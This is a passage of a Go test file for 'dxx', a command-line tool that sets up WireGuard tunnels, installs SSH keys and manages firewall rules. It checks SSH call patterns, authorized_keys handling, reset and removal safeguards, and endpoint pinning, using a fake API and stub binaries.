	calls := strings.Split(strings.TrimSpace(string(logb)), "\n")
	// key probe, interactive login, fresh key probe, preflight
	if len(calls) != 4 || !strings.Contains(calls[0], "BatchMode=yes") || strings.Contains(calls[1], "BatchMode") || !strings.Contains(calls[2], "ControlPath=none") {
		t.Fatalf("unexpected ssh calls:\n%s", logb)
	}
	sock := "ControlPath=" + filepath.Join(dir, "cm")
	for _, i := range []int{0, 1, 3} {
		if !strings.Contains(calls[i], "ControlMaster=auto") || !strings.Contains(calls[i], sock) {
			t.Errorf("call %d does not use the shared connection: %s", i, calls[i])
		}
	}
}

func TestInstallKeyScript(t *testing.T) {
	home := t.TempDir()
	run := func(key string) {
		t.Helper()
		cmd := exec.Command("sh", "-c", installKeyScript)
		cmd.Env = append(os.Environ(), "HOME="+home)
		cmd.Stdin = strings.NewReader(key + "\n")
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("script: %v\n%s", err, out)
		}
	}
	auth := filepath.Join(home, ".ssh", "authorized_keys")
	os.Mkdir(filepath.Join(home, ".ssh"), 0o700)
	os.WriteFile(auth, []byte("ssh-ed25519 AAAAold someone"), 0o600) // no trailing newline
	run("ssh-ed25519 AAAAnew me@mac")
	run("ssh-ed25519 AAAAnew me@mac")
	b, _ := os.ReadFile(auth)
	if string(b) != "ssh-ed25519 AAAAold someone\nssh-ed25519 AAAAnew me@mac\n" {
		t.Errorf("authorized_keys:\n%q", b)
	}
	if st, _ := os.Stat(auth); st.Mode().Perm() != 0o600 {
		t.Errorf("mode %v", st.Mode())
	}
}

func TestReset(t *testing.T) {
	dir := t.TempDir()
	dxx := filepath.Join(dir, "dxx")
	if out, err := exec.Command("go", "build", "-o", dxx, ".").CombinedOutput(); err != nil {
		t.Fatalf("build: %v\n%s", err, out)
	}
	// "phone" stands for a tunnel made in the portal: reset must not touch it.
	api := &fakeAPI{tunnels: []map[string]any{{"tunnel_token": "tt-portal", "name": "phone", "server": "vie", "assigned_ip": "10.10.0.77"}}}
	srv := httptest.NewServer(api)
	defer srv.Close()

	bin := filepath.Join(dir, "bin")
	os.Mkdir(bin, 0o755)
	for name, script := range map[string]string{
		"wg-quick": `exit 0`,
		"wg":       `printf 'utun9\tc2VydmVya2V5c2VydmVya2V5c2VydmVya2V5c2VydjA=\t1700000000\n'`,
		"ping":     `echo "round-trip min/avg/max/stddev = 5.0/6.0/7.0/1.0 ms"`,
		"ssh-dead": `if [ "$1" = "-G" ]; then printf 'hostname 127.0.0.1\nport 1\n'; exit 0; fi; exit 255`,
	} {
		if err := os.WriteFile(filepath.Join(bin, name), []byte("#!/bin/sh\n"+script+"\n"), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	logf, lockFile, fakeSSH := filepath.Join(dir, "ssh.log"), filepath.Join(dir, "LOCKED"), filepath.Join(dir, "ssh")
	writeFakeSSH(t, fakeSSH, logf, lockFile, "1")
	token := filepath.Join(dir, "token")
	os.WriteFile(token, []byte("secret-token\n"), 0o600)
	hosts, local, conf := filepath.Join(dir, "hosts.json"), filepath.Join(dir, "dxx-local.json"), filepath.Join(dir, "dxx.conf")
	env := append(os.Environ(), "DOXX_API="+srv.URL, "DOXX_TOKEN=", "DOXX_TOKEN_FILE="+token,
		"DXX_STATE="+hosts, "DXX_WG_QUICK="+filepath.Join(bin, "wg-quick"), "DXX_PING="+filepath.Join(bin, "ping"),
		"DXX_SUDO=", "DXX_DIAL_TIMEOUT=300ms")
	run := func(wantOK bool, ssh string, args ...string) string {
		t.Helper()
		cmd := exec.Command(dxx, args...)
		cmd.Env = append(append([]string{}, env...), "DXX_SSH="+ssh)
		out, err := cmd.CombinedOutput()
		if (err == nil) != wantOK {
			t.Fatalf("dxx %v: err=%v\n%s", args, err, out)
		}
		return string(out)
	}
	exists := func(p string) bool { _, err := os.Stat(p); return err == nil }
	setup := func() {
		t.Helper()
		run(true, fakeSSH, "connect")
		run(true, fakeSSH, "up", "root@203.0.113.10", "--as", "hetzner")
		run(true, fakeSSH, "name", "other", "root@198.51.100.7")
		if len(api.tunnels) != 3 || len(api.rules) != 1 {
			t.Fatalf("setup: tunnels=%v rules=%v", api.tunnels, api.rules)
		}
	}

	// Unreachable server: it is kept, and so is everything needed to reach it.
	setup()
	if out := run(false, fakeSSH, "connect", "--name", "dxx-hetzner"); !strings.Contains(out, "belongs to the server hetzner") {
		t.Errorf("connect must refuse a server's tunnel:\n%s", out)
	}
	out := run(false, filepath.Join(bin, "ssh-dead"), "reset", "--yes")
	if !strings.Contains(out, "skipped") || !strings.Contains(out, "could not clean hetzner") {
		t.Errorf("reset with a dead server:\n%s", out)
	}
	if b, _ := os.ReadFile(hosts); !strings.Contains(string(b), "hetzner") || len(api.tunnels) != 3 || !exists(conf) || !exists(local) {
		t.Errorf("a failed reset must keep the server and this computer's tunnel: hosts=%s tunnels=%v", b, api.tunnels)
	}

	// Dry run and a missing confirmation change nothing.
	run(true, fakeSSH, "lock", "hetzner")
	before := len(api.calls)
	if out = run(true, fakeSSH, "reset", "--dry-run"); !strings.Contains(out, `delete tunnel "dxx-hetzner"`) {
		t.Errorf("dry run plan:\n%s", out)
	}
	run(false, fakeSSH, "reset")
	if len(api.calls) != before || !exists(lockFile) || !exists(conf) {
		t.Error("dry run or unconfirmed reset changed something")
	}

	// The real thing: locked server unlocked and cleaned, dxx's tunnels and rule gone.
	out = run(true, fakeSSH, "reset", "--yes")
	t.Log(out)
	if len(api.tunnels) != 1 || api.tunnels[0]["name"] != "phone" || len(api.rules) != 0 {
		t.Errorf("after reset: tunnels=%v rules=%v", api.tunnels, api.rules)
	}
	logb, _ := os.ReadFile(logf)
	if exists(lockFile) || !strings.Contains(string(logb), "echo unlocked") || !strings.Contains(string(logb), "wg-quick@doxx0") {
		t.Error("server was not unlocked and torn down")
	}
	for _, p := range []string{hosts, local, conf, filepath.Join(dir, "cm")} {
		if exists(p) {
			t.Errorf("%s still exists after reset", p)
		}
	}
	if !exists(token) {
		t.Error("reset removed the token")
	}
	if out = run(true, fakeSSH, "reset", "--yes"); !strings.Contains(out, "nothing to reset") {
		t.Errorf("second reset:\n%s", out)
	}
}

func TestRm(t *testing.T) {
	dir := t.TempDir()
	dxx := filepath.Join(dir, "dxx")
	if out, err := exec.Command("go", "build", "-o", dxx, ".").CombinedOutput(); err != nil {
		t.Fatalf("build: %v\n%s", err, out)
	}
	api := &fakeAPI{tunnels: []map[string]any{
		{"tunnel_token": "tt-laptop", "name": "macbook", "server": "vie", "assigned_ip": "10.10.0.5"},
		{"tunnel_token": "tt-phone", "name": "phone", "server": "vie", "assigned_ip": "10.10.0.77"},
	}}
	srv := httptest.NewServer(api)
	defer srv.Close()
	fakeSSH, hosts := filepath.Join(dir, "ssh"), filepath.Join(dir, "hosts.json")
	writeFakeSSH(t, fakeSSH, filepath.Join(dir, "ssh.log"), filepath.Join(dir, "LOCKED"), "1")
	env := append(os.Environ(), "DOXX_API="+srv.URL, "DOXX_TOKEN=secret-token", "DXX_SSH="+fakeSSH, "DXX_STATE="+hosts)
	run := func(wantOK bool, args ...string) string {
		t.Helper()
		cmd := exec.Command(dxx, args...)
		cmd.Env = env
		out, err := cmd.CombinedOutput()
		if (err == nil) != wantOK {
			t.Fatalf("dxx %v: err=%v\n%s", args, err, out)
		}
		return string(out)
	}
	run(true, "up", "root@203.0.113.10", "--as", "hetzner", "--server", "vie.doxx.net", "--allow-from", "macbook")

	// Rules: listed with the name behind the source IP, removed by that name.
	if out := run(true, "rules"); !strings.Contains(out, "dxx-hetzner") || !strings.Contains(out, "10.10.0.5 (macbook)") {
		t.Errorf("rules:\n%s", out)
	}
	run(false, "rules", "rm", "dxx-hetzner", "macbook", "--port", "2222")
	run(false, "rules", "rm", "dxx-hetzner", "phone")
	if len(api.rules) != 1 {
		t.Fatalf("a non-matching rm removed a rule: %v", api.rules)
	}
	run(true, "rules", "rm", "dxx-hetzner", "macbook")
	if out := run(false, "rules", "rm", "dxx-hetzner", "all"); len(api.rules) != 0 || !strings.Contains(out, "no matching rule") {
		t.Errorf("rules after rm: %v\n%s", api.rules, out)
	}
	if out := run(true, "rules"); !strings.Contains(out, "no firewall rules") {
		t.Errorf("empty rules:\n%s", out)
	}

	// Tunnels: confirmation is required, unknown names delete nothing.
	run(false, "tunnels", "rm", "phone")
	run(false, "tunnels", "rm", "phone", "nope", "--yes")
	if len(api.tunnels) != 3 {
		t.Fatalf("a refused rm deleted a tunnel: %v", api.tunnels)
	}
	run(true, "tunnels", "rm", "phone", "--yes")
	if out := run(true, "tunnels"); strings.Contains(out, "phone") || !strings.Contains(out, "macbook") {
		t.Errorf("tunnels after rm:\n%s", out)
	}

	// A saved server's tunnel needs --force, which also clears the saved mesh data.
	if out := run(false, "tunnels", "rm", "dxx-hetzner", "--yes"); !strings.Contains(out, "dxx down hetzner --delete-tunnel") {
		t.Errorf("rm of a server's tunnel:\n%s", out)
	}
	run(true, "tunnels", "rm", "dxx-hetzner", "--yes", "--force")
	b, _ := os.ReadFile(hosts)
	if len(api.tunnels) != 1 || strings.Contains(string(b), "dxx-hetzner") || strings.Contains(string(b), "mesh_ip") || !strings.Contains(string(b), "root@203.0.113.10") {
		t.Errorf("after forced rm: tunnels=%v hosts=%s", api.tunnels, b)
	}
}

func TestPinEndpoint(t *testing.T) {
	conf := "[Interface]\nAddress = 10.1.2.3/32\n\n[Peer]\nPublicKey = X=\nEndpoint = wireguard.fra.eu.doxx.net:51820\nAllowedIPs = 10.0.0.0/8, 2602:f5c1::/36\n"
	lookup := func(ips ...string) func(string) ([]net.IP, error) {
		return func(string) ([]net.IP, error) {
			var out []net.IP
			for _, s := range ips {
				out = append(out, net.ParseIP(s))
			}
			return out, nil
		}
	}
	// The mesh-range IPv6 address must never be chosen, whatever the order.
	got, err := PinEndpoint(conf, lookup("2602:f5c1:d::10:1", "74.126.145.1"))
	if err != nil || !strings.Contains(got, "Endpoint = 74.126.145.1:51820\n") {
		t.Fatalf("want the IPv4 endpoint, got err=%v conf=\n%s", err, got)
	}
	got, err = PinEndpoint(conf, lookup("2602:f5c1:d::10:1", "2001:db8::1"))
	if err != nil || !strings.Contains(got, "Endpoint = [2001:db8::1]:51820\n") {
		t.Fatalf("want the non-mesh IPv6 endpoint, got err=%v conf=\n%s", err, got)
	}
	if _, err := PinEndpoint(conf, lookup("2602:f5c1:d::10:1")); err == nil {
		t.Fatal("want an error when every address is inside the mesh range")
	}
	literal := strings.Replace(conf, "wireguard.fra.eu.doxx.net", "74.126.145.1", 1)
	if got, err := PinEndpoint(literal, lookup()); err != nil || got != literal {
		t.Fatalf("a literal non-mesh endpoint must pass through unchanged, got err=%v conf=\n%s", err, got)
	}
}
